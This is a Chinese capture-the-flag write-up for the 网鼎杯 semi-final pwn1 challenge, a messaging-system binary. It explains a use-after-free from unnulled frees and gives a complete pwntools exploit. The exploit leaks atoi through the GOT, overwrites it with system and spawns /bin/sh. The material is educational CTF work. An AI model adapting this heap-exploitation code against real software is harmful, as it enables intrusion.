title: 网鼎杯半决赛pwn1
categories:
- PWN
---

# 一个短信系统

- 定义了两个结构体,分别如下,一个是用户信息的结构体,一个是信息结构体
  
```
00000000
00000000 message         struc ; (sizeof=0x18, align=0x8, mappedto_6)
00000000 title           dq ?                    ; offset
00000008 content         dq ?
00000010 next            dq ?
00000018 message         ends
00000018
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 pwn             struc ; (sizeof=0x128, align=0x8, mappedto_7)
00000000 malloc_name_ptr dq ?
00000008 age             dq ?
00000010 description     db 256 dup(?)
00000110 messagenode     dq ?                    ; offset
00000118 friend_ptr      dq ?
00000120 inuse           dq ?
00000128 pwn             ends
00000128
```

- 程序逻辑有一些复杂,但是有几个关键的地方值得注意一下
- 人物信息结构体中有许多指针,而且排布相对稳定
- 程序只有两处地方调用了free函数,并且未置空指针,这就导致了UAF的存在
- 还有strdup函数,第一次见,作用不是很清楚,去查了一下才知道它的作用和malloc后scanf是一样的

- 程序中有大量的链表指针操作,显得非常复杂,但是不用太过于纠结,在我尝试了一下执行free后,人物信息结构体被free掉了,这就导致了有0x130的空间可以被利用
- 期间我尝试了利用strdup来进行堆块错位的操作,但是并没有成功,因为p64()函数自动补的0影响了strdup的过程,而唯一比较容易的可控的地方是nameptr,只要覆盖了name指针内容,show后再进行updata,就可以leak程序基址修改程序的got表
- 这里我free了两块大堆块,导致了我有0x260的空间可以使用,然后我就可以利用刚才的strdup,来进行指针的覆盖
  
```python
from pwn import *

r = process("./pwn")
atoi_libc = 0x36E80 #offset
sys_libc = 0x45390

def register(namesize,name):
    r.sendlineafter("Your choice:","2")
    r.sendlineafter("Input your name size:",str(namesize))
    r.sendafter("Input your name:",name)
    r.sendlineafter("Input your age:","18")
    r.sendlineafter("Input your description:","1"*0x100)

def login(name):
    r.sendlineafter("Your choice:","1")
    r.sendafter("Please input your user name:",name)

def show():
    r.sendlineafter("Your choice:","1")

def edit(name,age):
    r.sendlineafter("Your choice:","2")
    r.sendafter("Input your name:",name)
    r.sendlineafter("Input your age:","18")
    r.sendlineafter("Input your description:","1"*0x100)

def AddDeleFriend(module,name):
    r.sendlineafter("Your choice:","3")
    r.sendafter("Input the friend's name:",name)
    r.sendlineafter("So..Do u want to add or delete this friend?(a/d)",module)

def message(name,content,title):
    r.sendlineafter("Your choice:","4")
    r.sendafter("Which user do you want to send a msg to:",name)
    r.sendlineafter("Input your message title:",title)
    r.sendlineafter("Input your content:",content)
    
def logout():
    r.sendlineafter("Your choice:","6")


def exp():
    register(0x80,"111111")
    register(0x80,"222222")

    login("111111")
    AddDeleFriend("a","111111")
    AddDeleFriend("d","111111")
    logout()
    login("222222")
    AddDeleFriend("a","222222")
    AddDeleFriend("d","222222")
    payload = '\x30'*16*15
    payload += p64(0x602060)
    message("222222",payload,"title")
    show()

    r.recvuntil("Username:")
    atoi = u64(r.recv(6) +'\x00'*2)
    print "atoi :%x"%atoi
    system=atoi-atoi_libc + sys_libc
    edit(p64(system),18)
    r.sendline("/bin/sh")
    r.interactive()
    
if __name__ == "__main__":
    exp()
```